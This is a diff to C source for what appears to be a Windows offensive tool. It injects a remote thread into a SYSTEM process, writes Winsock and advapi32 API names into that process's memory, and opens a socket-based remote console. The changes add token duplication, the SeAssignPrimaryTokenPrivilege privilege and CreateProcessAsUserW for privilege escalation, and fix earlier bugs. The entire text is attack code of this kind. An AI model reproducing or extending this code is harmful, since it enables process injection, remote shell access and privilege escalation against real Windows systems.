@@ -20,13 +20,17 @@ const char wsaConnectName[] = SR_WSACONNECT_NAME;
 const char selectName[] = SR_SELECT_NAME;
 const char openProcessTokenName[] = SR_OPENPROCESSTOKEN_NAME;
 const char adjustTokenPrivilegesName[] = SR_ADJUSTTOKENPRIVILEGES_NAME;
+const char duplicateTokenExName[] = SR_DUPLICATETOKENEX_NAME;
+const char createProcessAsUserWName[] = SR_CREATEPROCESSASUSERW_NAME;
+const char lookupPrivilegeValueWName[] = SR_LOOKUPPRIVILEGEVALUEW_NAME;
+const wchar_t assignPrimaryTokenPrivilegeName[] = SE_ASSIGNPRIMARYTOKEN_NAME;
 
 int main(int argc, char** argv)
 {
 	BOOL res;
 	DWORD pid, eventState, dwRemoteThreadRoutineSize, dwRemoteThreadId, tokenPrivilegesSize;
 	SIZE_T bytesWritten;
-	LPVOID lpRemoteThreadRoutine, lpRemoteInputThreadRoutine, lpRemoteOutputThreadRoutine, lpRemoteCommandLine, lpRemoteWs2_32DllName, lpRemoteAdvapi32DllName, lpRemoteWsaStartupName, lpRemoteWsaSocketWName, lpRemoteWsaConnectName, lpRemoteSelectName, lpRemoteOpenProcessTokenName, lpRemoteAdjustTokenPrivilegesName, lpRemoteThreadData, lpRemotePTP;
+	LPVOID lpRemoteThreadRoutine, lpRemoteInputThreadRoutine, lpRemoteOutputThreadRoutine, lpRemoteCommandLine, lpRemoteAssignPrimaryTokenPrivilege, lpRemoteWs2_32DllName, lpRemoteAdvapi32DllName, lpRemoteWsaStartupName, lpRemoteWsaSocketWName, lpRemoteWsaConnectName, lpRemoteSelectName, lpRemoteOpenProcessTokenName, lpRemoteAdjustTokenPrivilegesName, lpRemoteDuplicateTokenExName, lpRemoteCreateProcessAsUserWName, lpRemoteLookupPrivilegeValueW, lpRemoteThreadData, lpRemotePTP;
 	REMOTE_THREAD_DATA threadData;
 	HANDLE hSysProcess, hSysRemoteThread, hCurrentProcess, hRemoteCurrentProcess, hRemoteConsole, hConsoleInputThread, hConsoleOutputThread, hEventSuccess, hRemoteEventSuccess, hEventFail, hRemoteEventFail, hEventArray[2];
 	LUID_AND_ATTRIBUTES la[PRIVILEGE_COUNT];
@@ -91,7 +95,7 @@ int main(int argc, char** argv)
 	pTp = (TOKEN_PRIVILEGES*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, tokenPrivilegesSize);
 
 	pTp->PrivilegeCount = j;
-	CopyMemory(&pTp->Privileges, la, sizeof(LUID_AND_ATTRIBUTES) * j);
+	CopyMemory(pTp->Privileges, la, sizeof(LUID_AND_ATTRIBUTES) * j);
 
 	hEventSuccess = CreateEventW(NULL, TRUE, FALSE, SR_EVENT_SUCCESS_NAME);
 	if (hEventSuccess == NULL)
@@ -193,7 +197,23 @@ int main(int argc, char** argv)
 
 	// REMOTE ADJUSTTOKENPRIVILEGES NAME
 	lpRemoteAdjustTokenPrivilegesName = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)adjustTokenPrivilegesName, sizeof(adjustTokenPrivilegesName), FALSE, &bytesWritten);
-	printf("[+] Buffer for remote advapi32.dll library name initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteAdjustTokenPrivilegesName , (int)sizeof(adjustTokenPrivilegesName), (DWORD)bytesWritten);
+	printf("[+] Buffer for remote AdjustTokenPrivileges name initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteAdjustTokenPrivilegesName , (int)sizeof(adjustTokenPrivilegesName), (DWORD)bytesWritten);
+
+	// REMOTE DUPLICATETOKENEX NAME
+	lpRemoteDuplicateTokenExName = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)duplicateTokenExName, sizeof(duplicateTokenExName), FALSE, &bytesWritten);
+	printf("[+] Buffer for remote DuplicateTokenEx name initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteDuplicateTokenExName, (int)sizeof(duplicateTokenExName), (DWORD)bytesWritten);
+
+	// REMOTE CREATEPROCESSASUSERW NAME
+	lpRemoteCreateProcessAsUserWName = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)createProcessAsUserWName, sizeof(createProcessAsUserWName), FALSE, &bytesWritten);
+	printf("[+] Buffer for remote CreateProcessAsUserW name initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteCreateProcessAsUserWName, (int)sizeof(createProcessAsUserWName), (DWORD)bytesWritten);
+
+	// REMOTE ASSIGNPRIMARYTOKENPRIVILEGE NAME
+	lpRemoteAssignPrimaryTokenPrivilege = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)assignPrimaryTokenPrivilegeName, sizeof(assignPrimaryTokenPrivilegeName), FALSE, &bytesWritten);
+	printf("[+] Buffer for remote AssignPrimaryTokenPrivilege name initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteAssignPrimaryTokenPrivilege, (int)sizeof(assignPrimaryTokenPrivilegeName), (DWORD)bytesWritten);
+
+	// REMOTE LOOKUPPRIVILEGEVALUEW NAME
+	lpRemoteLookupPrivilegeValueW = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)lookupPrivilegeValueWName, sizeof(lookupPrivilegeValueWName), FALSE, &bytesWritten);
+	printf("[+] Buffer for remote LookupPrivilegeValueW name initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteLookupPrivilegeValueW, (int)sizeof(lookupPrivilegeValueWName), (DWORD)bytesWritten);
 
 	ZeroMemory(&threadData, sizeof(threadData));
 
@@ -209,7 +229,6 @@ int main(int argc, char** argv)
 	threadData.GetCurrentProcess = GetCurrentProcess;
 	threadData.WriteFile = WriteFile;
 	threadData.ReadFile = ReadFile;
-	threadData.CancelSynchronousIo = CancelSynchronousIo;
 	threadData.Sleep = Sleep;
 	threadData.SetEvent = SetEvent;
 	threadData.WaitForSingleObject = WaitForSingleObject;
@@ -222,6 +241,7 @@ int main(int argc, char** argv)
 	threadData.hEventFail = hRemoteEventFail;
 	threadData.RemoteInputThread = lpRemoteInputThreadRoutine;
 	threadData.RemoteOutputThread = lpRemoteOutputThreadRoutine;
+	threadData.lpCreateProcessAsUserW = lpRemoteCreateProcessAsUserWName;
 
 	threadData.ctd.lpWS2_32DllName = lpRemoteWs2_32DllName;
 	threadData.ctd.lpWSAStartupName = lpRemoteWsaStartupName;
@@ -232,8 +252,11 @@ int main(int argc, char** argv)
 	threadData.ctd.port = port;
 
 	threadData.ttd.lpAdvapi32DllName = lpRemoteAdvapi32DllName;
+	threadData.ttd.lpAssignPrimaryTokenPrivilege = lpRemoteAssignPrimaryTokenPrivilege;
 	threadData.ttd.lpOpenProcessToken = lpRemoteOpenProcessTokenName;
-	threadData.ttd.lpOpenProcessToken = lpRemoteAdjustTokenPrivilegesName;
+	threadData.ttd.lpAdjustTokenPrivileges = lpRemoteAdjustTokenPrivilegesName;
+	threadData.ttd.lpDuplicateTokenEx = lpRemoteDuplicateTokenExName;
+	threadData.ttd.lpLookupPrivilegeValueW = lpRemoteLookupPrivilegeValueW;
 	threadData.ttd.pTp = (TOKEN_PRIVILEGES*)lpRemotePTP;
 
 	lpRemoteThreadData = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)&threadData, sizeof(threadData), FALSE, &bytesWritten);
